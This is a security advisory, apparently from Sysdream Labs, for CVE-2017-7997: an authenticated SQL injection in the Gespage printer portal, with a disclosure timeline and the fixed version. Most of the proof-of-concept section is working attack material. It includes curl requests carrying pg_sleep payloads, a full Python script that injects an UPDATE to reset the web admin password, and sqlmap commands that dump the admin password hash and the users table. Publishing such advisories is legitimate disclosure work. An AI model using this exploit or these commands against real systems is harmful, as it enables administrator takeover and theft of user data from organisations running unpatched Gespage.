@@ -1,0 +1,227 @@
+# [CVE-2017-7997] Gespage SQL Injection vulnerability
+
+## Description
+
+Gespage is a web solution providing a printer portal. Official Website:
+http://www.gespage.com/
+
+The web application does not properly filter several parameters sent by
+users, allowing authenticated SQL code injection (Stacked Queries -
+comment).
+
+These vulnerabilities could allow attackers to retrieve / update data
+from the database through the application.
+
+**CVE ID**: CVE-2017-7997
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-89
+
+**CVSS Base Score**: 8.6
+
+**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+
+
+### Proof of Concept (dumping database data)
+
+The parameters of these following pages are vulnerable:
+
+* Page: http://URL/ges/webapp/users/prnow.jsp
+  Parameter: show_prn
+  HTTP Method: Post
+
+* Page: http://URL/ges/webapp/users/blhistory.jsp
+  Parameter: show_month
+  HTTP Method: Post
+
+* Page: http://URL/ges/webapp/users/prhistory.jsp
+  Parameter: show_month
+  HTTP Method: Post
+
+We can then detect the SQL Injection by requesting the server with the
+curl tool, including a simple payload executing a sleep of different
+seconds:
+
+* Normal request:
+
+```
+curl --cookie "JSESSIONID=YOUR_COOKIE_HERE" -X POST -d "show_prn=1"
+https://172.16.217.134:7181/gespage/webapp/users/prnow.jsp --insecure -w
+"\nResponse Time:%{time_total}\n"
+
+Curl output: Response Time:0,122
+```
+
+* Sleep Injection of 3 seconds into the request:
+
+```
+curl --cookie "JSESSIONID=YOUR_COOKIE_HERE" -X POST -d
+"show_prn=1');SELECT PG_SLEEP(3)--"
+https://172.16.217.134:7181/gespage/webapp/users/prnow.jsp --insecure -w
+"\nResponse Time:%{time_total}\n"
+
+Curl output: Response Time: 3,126
+```
+
+* Sleep Injection of 6 seconds into the request:
+
+```
+curl --cookie "JSESSIONID=YOUR_COOKIE_HERE" -X POST -d
+"show_prn=1');SELECT PG_SLEEP(6)--"
+https://172.16.217.134:7181/gespage/webapp/users/prnow.jsp --insecure -w
+"\nResponse Time:%{time_total}\n"
+
+Curl output: Response Time: 6,126
+```
+
+We created a dedicated python script to change the web admin password in
+order to compromise the web application:
+
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+$ python update_gespage_pwd.py -c e06d40bc855c98751a5a2ff49daa -i
+http://192.168.160.128:7180/gespage -p 12345
+[+] Generating the new admin password hash
+    => Password hash (sha1) to inject in the Database:
+8cb2237d0679ca88db6464eac60da96345513964
+[+] Verifying connection to the web interface:
+http://192.168.160.128:7180/gespage/
+    => Connection OK
+[+] Exploiting the SQL injection
+    => Vulnerable page:
+http://192.168.160.128:7180/gespage/webapp/users/prnow.jsp
+    => Posting Data   : show_prn=A-PRINTER-ON-THE-WEB-LIST');UPDATE
+param_gespage SET param_value='8cb2237d0679ca88db6464eac60da96345513964'
+WHERE param_id='admin_pwd'--
+[+] Go to the web admin interface, http://192.168.160.128:7180/admin/
+and log on with admin:12345
+"""
+
+from argparse import ArgumentParser
+from hashlib import sha1
+from requests import Session
+from urllib3 import disable_warnings
+
+
+def exploit(args):
+    if args.ip_url[-1] != "/":
+        args.ip_url += "/"
+    print "[+] Generating the new admin password hash"
+    new_admin_pwd_hash = sha1(args.password).hexdigest()
+    print "    => Password hash (sha1) to inject in the Database: %s" %
+(new_admin_pwd_hash)
+    print "[+] Verifying connection to the web interface: %s" %
+(args.ip_url)
+    web_session = web_connection(args.ip_url, args.cookie)
+    print "[+] Exploiting the SQL injection"
+    sql_injection(args.ip_url, web_session, args.cookie, new_admin_pwd_hash)
+    print "[+] Go to the web admin interface, %s and log on with
+admin:%s" % (args.ip_url.replace('gespage', 'admin'), args.password)
+
+
+def sql_injection(url, session, user_cookie, new_admin_pwd_hash):
+    vulnerable_url = url + "webapp/users/prnow.jsp"
+    sql_update_query = "UPDATE param_gespage SET param_value='%s' WHERE
+param_id='admin_pwd'" % (new_admin_pwd_hash)
+    sql_injection_payload = "A-PRINTER-ON-THE-WEB-LIST');%s--" %
+(sql_update_query)
+    print "    => Vulnerable page: %s" % (vulnerable_url)
+    print "    => Posting Data   : show_prn=%s" %(sql_injection_payload)
+    response = session.post(vulnerable_url,
+cookies={"JSESSIONID":user_cookie}, verify=False, allow_redirects=True,
+data={"show_prn":sql_injection_payload})
+    if not response.status_code == 200:
+        print "   There is an error while posting the payload, try with
+sqlmap.py"
+        exit(2)
+
+
+def web_connection(url, user_cookie):
+    disable_warnings()
+    session = Session()
+    response = session.get(url, verify=False, allow_redirects=False,
+cookies={"JSESSIONID":user_cookie})
+    if (response.status_code == 302 and "webapp/user_main.xhtml" in
+response.text):
+        print "    => Connection OK"
+        return session
+    else:
+        print "    /!\ Error while connecting the web interface with the
+specified JSESSIONID cookie"
+        print "        => Make sure given application URL and JSESSIONID
+cookie are correct "
+        exit(1)
+
+
+if __name__ == '__main__':
+    parser = ArgumentParser(description='Exploit Gespage SQL injection
+by updating the admin password. You must create then specify an existing
+user in order to exploit the vulnerability')
+    parser.add_argument('-i','--ip_url', help='The web interface URL,
+ex: http://IP_ADDRESS:7181/gespage/',required=True)
+    parser.add_argument('-c','--cookie', help='JSESSIONID cookie of an
+authenticated user',required=True)
+    parser.add_argument('-p','--password', help='New admin
+password',required=True)
+    exploit(parser.parse_args())
+
+```
+
+Using [sqlmap](https://github.com/sqlmapproject/sqlmap), it is also
+possible to dump the content of the database, write other data, etc.
+
+Dumping the admin password hash (if changed from the initial 123456
+password):
+
+```
+python sqlmap.py -u "https://URL:7181/gespage/users/prnow.jsp"
+--cookie="JSESSIONID=YOUR_COOKIE_HERE"
+--data="show_prn=A-PRINTER-ON-THE-WEB-LIST" --dbms=PostgreSQL --risk 3
+--level 5 --technique TS -D public -T param_gespage -C param_value
+--time-sec 2 --dump --flush-session
+```
+
+Dumping the users table:
+
+```
+sqlmap.py -u "https://URL:7181/gespage/users/prnow.jsp"
+--cookie="JSESSIONID=YOU_COOKIE_HERE"
+--data="show_prn=A-PRINTER-ON-THE-WEB-LIST" --dbms=PostgreSQL --risk 3
+--level 5 --technique TS -D public -T users --time-sec 2 --dump
+```
+
+
+## Timeline (dd/mm/yyyy)
+
+* 06/03/2017 : Initial discovery
+* 13/03/2017 : First contact attempt (Web form)
+* 21/04/2017 : Second contact attempt (public e-mail address)
+* 23/06/2017 : Phone call and successful e-mail contact
+* 23/06/2017 : Technical details sent to the editor
+* 20/07/2017 : No reply, follow-up e-mail
+* 27/07/2017 : Reply: fix planned for major release 7.5.0 in late September
+* 17/09/2017 : Informing the editor that we would publish in October
+* 3/10/2017 : Feedback from Gespage informing us that the issue has been
+fixed with version 7.4.9.
+* 02/01/2018 : Release of the advisory
+
+## Fixes
+
+Upgrade to Gespage 7.4.9
+
+## Affected versions
+
+* Versions up to 7.4.8
+
+## Credits
+
+* Mickael KARATEKIN <m.karatekin@sysdream.com>
+
+
+-- SYSDREAM Labs <labs@sysdream.com> GPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1 * Website: https://sysdream.com/ * Twitter: @sysdream
